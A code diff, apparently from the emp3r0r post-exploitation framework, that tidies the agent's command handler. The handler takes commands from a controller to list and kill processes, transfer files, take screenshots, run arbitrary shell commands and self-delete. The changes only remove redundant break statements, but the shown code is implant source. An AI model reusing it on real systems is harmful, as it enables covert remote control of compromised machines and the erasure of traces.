@@ -75,21 +75,20 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		out, err = shellPs()
 		if err != nil {
 			out = fmt.Sprintf("Failed to ps: %v", err)
+			break
 		}
-		break
 	case "kill":
 		// Usage: kill --dst <pid>...
 		// Kills the specified processes.
 		out, err = shellKill(cmdSlice[2:]) // skip "kill" and "--dst"
 		if err != nil {
 			out = fmt.Sprintf("Failed to kill: %v", err)
+			break
 		}
-		break
 	case "net_helper":
 		// Usage: net_helper
 		// Displays network information.
 		out = shellNet()
-		break
 	case "get":
 		// Usage: get --file_path <file_path> --offset <offset> --token <token>
 		// Downloads a file from the agent starting at the specified offset.
@@ -156,7 +155,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			out = *file_path + err.Error()
 			break
 		}
-		break
 	case "screenshot":
 		// Usage: screenshot
 		// Takes a screenshot and sends the file path to CC.
@@ -174,7 +172,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err == nil {
 			out = RuntimeConfig.AgentRoot + "/" + out
 		}
-		break
 	case "suicide":
 		// Usage: suicide
 		// Deletes all agent files and exits.
@@ -185,7 +182,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		out = fmt.Sprintf("Agent %s is self purging...", RuntimeConfig.AgentTag)
 		err = os.RemoveAll(RuntimeConfig.AgentRoot)
 		if err != nil {
-			out = fmt.Sprintf("Failed to cleanup files")
+			out = "Failed to cleanup files"
 		}
 		sendResponse(out)
 		log.Println("Exiting...")
@@ -203,7 +200,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err != nil {
 			out = err.Error()
 		}
-		break
 	case "rm":
 		// Usage: rm --dst <path>
 		// Removes the specified file or directory.
@@ -217,7 +213,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err = os.RemoveAll(*path); err != nil {
 			out = fmt.Sprintf("Failed to delete %s: %v", *path, err)
 		}
-		break
 	case "mkdir":
 		// Usage: mkdir --dst <path>
 		// Creates a directory at the specified path.
@@ -231,7 +226,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err = os.MkdirAll(*path, 0o700); err != nil {
 			out = fmt.Sprintf("Failed to mkdir %s: %v", *path, err)
 		}
-		break
 	case "cp":
 		// Usage: cp --src <source> --dst <destination>
 		// Copies a file or directory from source to destination.
@@ -246,7 +240,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err = copy.Copy(*src, *dst); err != nil {
 			out = fmt.Sprintf("Failed to copy %s to %s: %v", *src, *dst, err)
 		}
-		break
 	case "mv":
 		// Usage: mv --src <source> --dst <destination>
 		// Moves a file or directory from source to destination.
@@ -261,7 +254,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err = os.Rename(*src, *dst); err != nil {
 			out = fmt.Sprintf("Failed to move %s to %s: %v", *src, *dst, err)
 		}
-		break
 	case "cd":
 		// Usage: cd --dst <path>
 		// Changes the current working directory to the specified path.
@@ -277,7 +269,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		} else {
 			out = "changed directory to " + strconv.Quote(*path)
 		}
-		break
 	case "pwd":
 		// Usage: pwd
 		// Prints the current working directory.
@@ -291,7 +282,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			pwd = err.Error()
 		}
 		out = "current working directory: " + pwd
-		break
 	case "put":
 		// Usage: put --file <file> --path <destination> --size <size> --checksum <checksum>
 		// Downloads a file from CC to the specified path on the agent.
@@ -317,7 +307,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if downloadedSize < *size {
 			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, *size, checksum)
 		}
-		break
 	default:
 		// exec cmd using os/exec normally, sends stdout and stderr back to CC
 		if runtime.GOOS == "windows" {
@@ -358,7 +347,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			out = fmt.Sprintf("%s running in background, PID is %d",
 				cmdSlice, cmd.Process.Pid)
 		}
-		break
 	}
 	defer sendResponse(out)
 }
